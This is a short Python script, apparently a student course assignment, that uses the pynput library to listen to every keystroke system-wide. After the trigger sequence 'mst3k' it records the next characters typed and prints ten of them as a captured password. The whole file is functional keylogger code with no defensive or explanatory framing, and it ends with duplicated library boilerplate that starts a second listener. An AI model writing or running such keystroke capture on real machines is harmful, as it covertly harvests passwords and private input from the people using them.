# Name: Alisha Gursahaney
# Net Id: amg9zd

from pynput import keyboard

password = ""
count = 0

def on_press(key):
    global password, count

    try:
        if 5 <= count <= 15:
            password += key.char
            count += 1
        elif key.char == 'm' and count == 0:
            password += key.char
            count += 1
        elif key.char == 's' and count == 1:
            password += key.char
            count += 1
        elif key.char == 't' and count == 2:
            password += key.char
            count += 1
        elif key.char == '3' and count == 3:
            password += key.char
            count += 1
        elif key.char == 'k' and count == 4:
            password += key.char
            count += 1
        else:
            count = 0
            

    except AttributeError:
        #print('special key {0} pressed'.format(key))
        pass

    if count == 15:
        print('{' + password[5:15] + '}')
    

def on_release(key):
    #print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()